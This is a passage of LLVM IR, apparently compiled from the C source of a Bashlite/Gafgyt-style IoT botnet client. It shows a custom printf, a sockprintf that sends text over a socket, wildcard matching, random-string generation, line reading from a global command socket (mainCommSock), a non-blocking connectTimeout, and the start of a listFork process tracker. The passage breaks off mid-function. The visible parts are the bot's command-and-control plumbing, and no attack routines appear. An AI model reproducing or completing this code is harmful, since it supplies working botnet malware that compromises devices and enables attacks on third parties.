  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #7
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #7
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #8 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #7, !srcloc !14
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %tmpcast) #7
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #7
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !15
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
